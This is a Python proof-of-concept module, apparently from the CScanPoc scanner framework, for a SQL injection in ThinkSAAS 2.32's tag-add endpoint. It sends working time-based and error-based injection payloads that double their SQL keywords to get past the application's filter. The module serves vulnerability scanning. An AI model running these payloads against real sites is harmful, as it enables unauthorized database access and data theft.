# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'ThinkSAAS_0002'  # 平台漏洞编号
    name = 'ThinkSAAS 2.32 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-17'  # 漏洞公布时间
    desc = '''
        ThinkSAAS开源社区基于PHP+MySQL开发完成，运行于Linux 平台和Windows平台，完美支持Apache和Nginx运行环境。
        \app\tag\action\add.php
        $objname和$idname可控，而tsFilter()函数只进行了简单的过滤，可以被绕过。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3316/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkSAAS'  # 漏洞组件名称
    product_version = '2.32'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0085f04f-a65a-4a44-bf0c-8cfb2453b253'  # 平台 POC 编号
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php?app=tag&ac=add&ts=do'
            data_sleep = "objname=article&idname=1=1 anand d (selselect ect 1 frfrom om(selselect ect cocount unt(*),concat((selselect ect (selselect ect (selselect ect sleep(10))) frfrom om information_schema.tables limit 0,1),floor(rand(0)*2))x frfrom om information_schema.tables group bby y x)a)/*&objid=3&tags=5"
            data_normal = "objname=article&idname=1=1 anand d (selselect ect 1 frfrom om(selselect ect cocount unt(*),concat((selselect ect (selselect ect (selselect ect user())) frfrom om information_schema.tables limit 0,1),floor(rand(0)*2))x frfrom om information_schema.tables group bby y x)a)/*&objid=3&tags=5"
            url = self.target + payload
            time_start = time.time()
            requests.post(url, data=data_normal)
            time_end_normal = time.time()
            requests.post(url, data=data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 9:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
